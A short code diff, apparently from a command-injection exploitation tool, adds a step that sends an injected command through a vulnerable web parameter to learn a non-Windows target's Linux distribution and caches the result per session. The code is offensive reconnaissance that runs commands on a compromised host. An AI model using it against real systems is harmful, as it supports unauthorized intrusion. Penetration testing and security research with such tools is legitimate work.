@@ -132,8 +132,25 @@ def system_information(separator, TAG, prefix, suffix, whitespace, http_request_
     session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
   else:
     target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+
   if target_os:
     target_os = "".join(str(p) for p in target_os)
+    if settings.TARGET_OS != "win":
+      cmd = settings.DISTRO_INFO
+      if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
+        # Command execution results.
+        response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+        # Perform target page reload (if it is required).
+        if settings.URL_RELOAD:
+          response = requests.url_reload(url, timesec)
+        # Evaluate injection results.
+        distro_name = cb_injector.injection_results(response, TAG, cmd)
+        distro_name = "".join(str(p) for p in distro_name)
+        if len(distro_name) != 0:
+          target_os = target_os + " (" + distro_name + ")"
+        session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
+      else:
+        target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
     if settings.TARGET_OS == "win":
       cmd = settings.WIN_RECOGNISE_HP
     else:
